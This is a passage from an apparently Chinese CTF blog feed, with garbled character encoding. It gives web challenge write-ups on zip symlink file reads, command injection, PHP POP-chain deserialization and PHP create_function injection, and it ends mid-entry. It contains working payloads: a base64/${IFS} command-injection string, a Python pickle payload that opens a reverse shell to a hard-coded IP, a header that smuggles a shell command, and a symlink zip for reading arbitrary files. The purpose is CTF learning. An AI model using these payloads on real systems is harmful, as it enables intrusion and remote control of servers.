    <content type="html"><![CDATA[<h1 id="è½¯é“¾æ¥"><a href="#è½¯é“¾æ¥" class="headerlink" title="è½¯é“¾æ¥"></a>è½¯é“¾æ¥</h1><p>è½¯é“¾æ¥æ˜¯Linuxä¸­çš„ä¸€ä¸ªå¸¸è§æŒ‡ä»¤ï¼ŒåŠŸèƒ½æ˜¯ä¸ºæŸä¸€ä¸ªæ–‡ä»¶åœ¨å¦å¤–ä¸€ä¸ªä½ç½®å»ºç«‹ä¸€ä¸ªåŒæ­¥çš„é“¾æ¥ã€‚é€šä¿—æ¥è®²ï¼Œè½¯é“¾æ¥ç±»ä¼¼äºWindowsä¸­çš„å¿«æ·æ–¹å¼ï¼Œæ¯”å¦‚æŸä¸ªæ–‡ä»¶åœ¨aæ–‡ä»¶å¤¹ï¼Œä½†æˆ‘ä»¬æƒ³åœ¨bæ–‡ä»¶å¤¹å†…è®¿é—®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨bæ–‡ä»¶å¤¹å»ºç«‹è¿™ä¸ªæ–‡ä»¶çš„å¿«æ·æ–¹å¼ï¼Œæ‰“å¼€å¿«æ·æ–¹å¼ä¹Ÿå°±æ‰“å¼€äº†è¿™ä¸ªæ–‡ä»¶ã€‚</p><h1 id="ä¾‹é¢˜åˆ†æ"><a href="#ä¾‹é¢˜åˆ†æ" class="headerlink" title="ä¾‹é¢˜åˆ†æ"></a>ä¾‹é¢˜åˆ†æ</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./upload&#x27;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$file_ext</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>) &amp;&amp; (<span class="keyword">new</span> <span class="title class_">ZipArchive</span>())-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$file_tmp</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_name_new</span> = <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;&#x27;</span>, <span class="literal">true</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file_ext</span>;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name_new</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Failed to upload file&#x27;</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;unzip &#x27;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$file_destination</span>) . <span class="string">&#x27; -d &#x27;</span> . <span class="string">&#x27;uploads/&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240206192543903.png" alt="image-20240206192543903"></p><p>è¿™é“é¢˜çš„flagåœ¨æ ¹ç›®å½•ï¼Œæˆ‘ä»¬åœ¨æ¡Œé¢åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥flagæŒ‡å‘&#x2F;flagï¼Œç„¶åzipæ‰“åŒ…å‹ç¼©ï¼Œè¿™é‡Œçš„â€“sublinksæŒ‡åŒ…å«ç¬¦å·é“¾æ¥æœ¬èº«ï¼Œè€Œä¸æ˜¯å®ƒä»¬æŒ‡å‘çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´å½“è§£å‹è¿™ä¸ªå‹ç¼©åŒ…æ—¶ï¼Œå¾—åˆ°çš„æ˜¯ç¬¦å·é“¾æ¥è€Œä¸æ˜¯æŒ‡å‘çš„æ–‡ä»¶</p><p><img src="/../images/image-20240206193207771.png" alt="image-20240206193207771"></p><p>é‚£ä¹ˆåœ¨è¿™é“é¢˜ä¸­ï¼Œæˆ‘ä»¬ä¸Šä¼ payload.zipæ–‡ä»¶ï¼Œè„šæœ¬ä¼šè‡ªåŠ¨è§£å‹å‡ºflagï¼Œè€Œæ­¤æ—¶çš„flagæŒ‡å‘çš„å°±æ˜¯&#x2F;flagï¼Œå½“æˆ‘ä»¬ä»¥getæ–¹å¼è®¿é—®&#x2F;uploads&#x2F;flagæ—¶ï¼Œå°±ä¼šç›´æ¥ä¸‹è½½åˆ°æ ¹ç›®å½•ä¸‹çš„flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;è½¯é“¾æ¥&quot;&gt;&lt;a href=&quot;#è½¯é“¾æ¥&quot; class=&quot;headerlink&quot; title=&quot;è½¯é“¾æ¥&quot;&gt;&lt;/a&gt;è½¯é“¾æ¥&lt;/h1&gt;&lt;p&gt;è½¯é“¾æ¥æ˜¯Linuxä¸­çš„ä¸€ä¸ªå¸¸è§æŒ‡ä»¤ï¼ŒåŠŸèƒ½æ˜¯ä¸ºæŸä¸€ä¸ªæ–‡ä»¶åœ¨å¦å¤–ä¸€ä¸ªä½ç½®å»ºç«‹ä¸€ä¸ªåŒæ­¥çš„é“¾æ¥ã€‚é€šä¿—æ¥è®²ï¼Œè½¯é“¾æ¥ç±»ä¼¼äºWindowsä¸­çš„å¿«æ·</summary>
      
    
    
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>BeginCTF2024webéƒ¨åˆ†wp</title>
    <link href="http://example.com/2024/02/06/BeginCTF2024web%E9%83%A8%E5%88%86wp/"/>
    <id>http://example.com/2024/02/06/BeginCTF2024web%E9%83%A8%E5%88%86wp/</id>
    <published>2024-02-06T03:38:10.000Z</published>
    <updated>2024-02-06T03:41:45.782Z</updated>
    
    <content type="html"><![CDATA[<h1 id="readbooks"><a href="#readbooks" class="headerlink" title="readbooks"></a>readbooks</h1><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public/*|e%22%22cho$%7BIFS%7D%22Y2F0IC9fZmxhZw%22$%7BIFS%7D|$%7BIFS%7Dba%22%22se64$%7BIFS%7D-d$%7BIFS%7D|$%7BIFS%7Db%22%22ash</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240201214514521.png" alt="image-20240201214514521"></p><h1 id="pickelshop"><a href="#pickelshop" class="headerlink" title="pickelshop"></a>pickelshop</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">shell</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># bash -i &gt;&amp; /dev/tcp/ä½ çš„ip/9999 0&gt;&amp;1çš„base64</span></span><br><span class="line">        <span class="comment"># ä¸èƒ½ç›´æ¥bash -i 0&gt;&amp;1é‚£ç§å†™æ³•ï¼Œå› ä¸ºåƒæ˜¯&amp;è¿™äº›ç¬¦å· éƒ½æ˜¯linuxçš„shellå…³é”®å­— ä¼šå½±å“ä»–çš„è¯­æ³•</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (</span><br><span class="line">        <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMjAxLjM5LjIzNy84ODk5IDA+JjE= | base64 -d | bash &#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = shell()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(k)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åå¼¹shell</p><h1 id="POPgadget"><a href="#POPgadget" class="headerlink" title="POPgadget"></a>POPgadget</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = [<span class="keyword">new</span> <span class="title class_">Test</span>(),<span class="string">&quot;q222&quot;</span>];</span><br><span class="line">        <span class="comment">//ä¹Ÿå¯ä»¥å†™ä¸º$this-&gt;func = &quot;Test::getFlag&quot;;è¿™æ ·ç”±äºæ²¡æœ‰å®ä¾‹åŒ–Testç±»ï¼Œè¿˜ä¸ä¼šè§¦å‘Testé‡Œçš„__wakeup()</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func=<span class="string">&quot;Test::getFlag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="variable">$Fun</span> = <span class="keyword">new</span> <span class="title class_">Fun</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="variable">$Fun</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$r1</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;Fun&quot;:1:&#x27;</span>,<span class="string">&#x27;&quot;Fun&quot;:2:&#x27;</span>,<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$r1</span>);</span><br></pre></td></tr></table></figure><h1 id="zupload-pro-plus-max-ultra"><a href="#zupload-pro-plus-max-ultra" class="headerlink" title="zupload-pro-plus-max-ultra"></a>zupload-pro-plus-max-ultra</h1><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./upload&#x27;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="variable">$extract_to</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_EXTRACT_TO&#x27;</span>] ?? <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$file_ext</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;unzip &#x27;</span> . <span class="variable">$file_tmp</span> . <span class="string">&#x27; -d &#x27;</span> . <span class="variable">$extract_to</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®ç‚¹åœ¨äº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$extract_to = $_SERVER[&#x27;HTTP_X_EXTRACT_TO&#x27;] ?? &#x27;uploads/&#x27;;</span><br></pre></td></tr></table></figure><p>å’Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#x27;unzip &#x27; . $file_tmp . &#x27; -d &#x27; . $extract_to);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„$extract_toæ˜¯å¯æ§çš„ï¼Œç›´æ¥æ‹¼æ¥å‘½ä»¤æ‰§è¡Œå°±å¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Extract-To: ./;cat /flag&gt;&gt;key.php</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240204115219882.png" alt="image-20240204115219882"></p><p><img src="/../images/image-20240204115231453.png" alt="image-20240204115231453"></p><h1 id="zupload-pro-plus-max-ultra-premium"><a href="#zupload-pro-plus-max-ultra-premium" class="headerlink" title="zupload-pro-plus-max-ultra-premium"></a>zupload-pro-plus-max-ultra-premium</h1><p><img src="/../images/image-20240206114054629.png" alt="image-20240206114054629"></p><p>unzipè½¯é“¾æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch /flag</span><br><span class="line">ln -s /flag flag</span><br><span class="line">zip --symlinks payload.zip flag</span><br></pre></td></tr></table></figure><p>è®¿é—®ä¸‹è½½&#x2F;uploads&#x2F;flagå³å¯</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;readbooks&quot;&gt;&lt;a href=&quot;#readbooks&quot; class=&quot;headerlink&quot; title=&quot;readbooks&quot;&gt;&lt;/a&gt;readbooks&lt;/h1&gt;&lt;p&gt;payload&lt;/p&gt;
&lt;figure class=&quot;highlight plain</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>create_function()å‡½æ•°ä»£ç æ‰§è¡Œ</title>
    <link href="http://example.com/2024/01/23/create-function-%E5%87%BD%E6%95%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2024/01/23/create-function-%E5%87%BD%E6%95%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2024-01-23T11:42:33.000Z</published>
    <updated>2024-01-23T12:07:46.774Z</updated>
    
    <content type="html"><![CDATA[<h1 id="create-function-å‡½æ•°"><a href="#create-function-å‡½æ•°" class="headerlink" title="create_function()å‡½æ•°"></a>create_function()å‡½æ•°</h1><p>é€‚ç”¨èŒƒå›´ï¼š php4 &gt;&#x3D;4.0.1  php5   php7</p><p>åŠŸèƒ½ï¼šæ ¹æ®ä¼ é€’çš„å‚æ•°åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå¹¶ä¸ºå…¶è¿”å›å”¯ä¸€åç§°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create_function(string $args,string $code)</span><br><span class="line">$args å£°æ˜çš„å‡½æ•°å˜é‡</span><br><span class="line">$code æ‰§è¡Œçš„æ–¹æ³•ä»£ç </span><br></pre></td></tr></table></figure><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return &quot;$a + $b = &quot; . ($a + $b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;function: &quot;</span> . <span class="variable">$test</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240123194729856.png" alt="image-20240123194729856"></p><p>å¯ä»¥çœ‹åˆ°åˆ›å»ºäº†åŒ¿åå‡½æ•°<strong>lambda</strong>å¹¶ä¸”æ‰§è¡Œäº†ä»£ç ã€‚</p><h1 id="æ„é€ ä»£ç æ‰§è¡Œ"><a href="#æ„é€ ä»£ç æ‰§è¡Œ" class="headerlink" title="æ„é€ ä»£ç æ‰§è¡Œ"></a>æ„é€ ä»£ç æ‰§è¡Œ</h1><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="string">&#x27;echo  &#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==============================&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$f1</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==============================&quot;</span>;</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šå£°æ˜å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 